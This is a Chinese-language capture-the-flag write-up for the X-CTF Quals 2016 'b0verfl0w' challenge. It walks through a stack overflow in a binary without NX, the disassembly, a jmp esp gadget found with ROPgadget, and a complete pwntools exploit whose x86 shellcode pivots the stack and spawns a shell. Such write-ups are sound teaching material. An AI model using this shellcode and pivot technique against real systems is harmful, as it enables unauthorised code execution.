---
title: X-CTF Quals 2016 - b0verfl0w
date: 2018-09-30 10:49:33
tags: [stack pivoting]
categories: [stack]
---
## 查看程序的安全保护，程序未开启NX
```
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

## 反汇编程序，源程序存在栈溢出漏洞
```C
signed int vul()
{
  char s; // [esp+18h] [ebp-20h]

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

## 分析汇编代码,fgets函数可以溢出0x28个字节的数据
我的理解是看`call    _fgets`这个call上面的参数，`lea     eax, [ebp+s]`ebp加上写入地址s的偏移后将该地址传给eax，值为[ebp-0x20]，`mov     [esp], eax`这句代码将上述的地址，传递给esp，现在栈指针指向的是s的具体地址，这个地址到ebp的距离为0x20各字节，所以最多可以溢出0x28个字节的数据

```
.text:0804851B vul             proc near               ; CODE XREF: main+6↑p
.text:0804851B
.text:0804851B s               = byte ptr -20h
.text:0804851B
.text:0804851B ; __unwind {
.text:0804851B                 push    ebp
.text:0804851C                 mov     ebp, esp
.text:0804851E                 sub     esp, 38h
.text:08048521                 mov     dword ptr [esp], offset s ; "\n======================"
.text:08048528                 call    _puts
.text:0804852D                 mov     dword ptr [esp], offset aWelcomeToXCtf2 ; "\nWelcome to X-CTF 2016!"
.text:08048534                 call    _puts
.text:08048539                 mov     dword ptr [esp], offset s ; "\n======================"
.text:08048540                 call    _puts
.text:08048545                 mov     dword ptr [esp], offset aWhatSYourName ; "What's your name?"
.text:0804854C                 call    _puts
.text:08048551                 mov     eax, ds:stdout@@GLIBC_2_0
.text:08048556                 mov     [esp], eax      ; stream
.text:08048559                 call    _fflush
.text:0804855E                 mov     eax, ds:stdin@@GLIBC_2_0
.text:08048563                 mov     [esp+8], eax    ; stream
.text:08048567                 mov     dword ptr [esp+4], 32h ; n
.text:0804856F                 lea     eax, [ebp+s]
.text:08048572                 mov     [esp], eax      ; s
.text:08048575                 call    _fgets
.text:0804857A                 lea     eax, [ebp+s]
.text:0804857D                 mov     [esp+4], eax
.text:08048581                 mov     dword ptr [esp], offset format ; "Hello %s."
.text:08048588                 call    _printf
.text:0804858D                 mov     eax, ds:stdout@@GLIBC_2_0
.text:08048592                 mov     [esp], eax      ; stream
.text:08048595                 call    _fflush
.text:0804859A                 mov     eax, 1
.text:0804859F                 leave
.text:080485A0                 retn
```

## 由于程序未开启NX，所以思路是在栈上布置shellcode，然后控制vul函数返回地址，即控制eip执行栈上的shellcode，栈上的布置如下：
> shellcoed || fake ebp || 0x08048504 || asm(sub esp,0x28;jmp esp)

0x08048504为jmp esp 的gadgets，覆盖了返回地址，当程序执行到ret时，将该地址pop给eip，并且esp会加4指向`asm(sub esp,0x28;jmp esp)`,然后eip执行地址0x08048504上的代码`jmp esp`，eip又会执行esp指向的`sub esp,0x28;jmp esp`，完成esp的劫持。正常情况下eip指向的是.text段中的代码，所以需要将`sub esp,0x28;jmp esp`转化为机器码，这里是十六进制机器码

## 通过ROPgadget，找到jmp esp gadgets的地址为0x08048504
```
$ ROPgadget --binary b0verfl0w --only 'jmp|ret'
Gadgets information
============================================================
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1

Unique gadgets found: 3
```
## EXP
```python
#!/usr/bin/env python
from pwn import *
p = process('./b0verfl0w')
jmp_esp = 0x08048504
shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

sub_jmp_esp = asm('sub esp, 0x28;jmp esp')
payload = shellcode_x86+'a'*(0x20-len(shellcode_x86))
payload += p32(0xdeadbeef)
payload += p32(jmp_esp)
payload += sub_jmp_esp

p.sendlineafter("What's your name?",payload)
p.interactive()
```
